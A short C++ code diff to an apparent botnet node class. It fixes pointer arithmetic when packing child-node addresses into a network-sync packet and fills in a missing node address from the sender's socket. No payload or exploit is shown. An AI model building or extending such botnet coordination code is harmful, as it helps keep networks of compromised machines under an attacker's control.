@@ -28,7 +28,7 @@ void BotnetNode::sendNetTree(
 	memset(buf, 0, 1024);
 	struct botnet_pack* default_pack = (struct botnet_pack*)buf;
 	tree_ext* extention = (tree_ext*)(buf + BOTNET_PACK_SIZE);
-	u_char* branches_data = (u_char*)(buf + BOTNET_PACK_SIZE + sizeof(tree_ext));
+	adr* branches_data = (adr*)(buf + BOTNET_PACK_SIZE + sizeof(tree_ext));
 
 	/* fill the packet with data*/
 	default_pack->type = NETWORK_SYNC;
@@ -37,7 +37,7 @@ void BotnetNode::sendNetTree(
 	for (BotnetNode* node : _branches)
 	{
 		memcpy(branches_data, &node->_adr, sizeof(adr));
-		branches_data += sizeof(adr);
+		branches_data++;
 	}
 
 	/* send the packet */
@@ -98,7 +98,8 @@ BotnetNode* BotnetNode::findNode(
 }
 
 void BotnetNode::handleSync(
-	const u_char* pack
+	const u_char* pack,
+	const struct sockaddr_in& peer_addr
 )
 {
 	/* locals */
@@ -119,6 +120,11 @@ void BotnetNode::handleSync(
 	}
 	
 	/* check if node already exists in tree */
+	if (base->host.ip == 0 && base->host.port == 0)
+	{
+		base->host.ip = peer_addr.sin_addr.s_addr;
+		base->host.port = peer_addr.sin_port;
+	}
 	base_node = findNode(base->host, temp_nodes);
 
 	if (base_node)
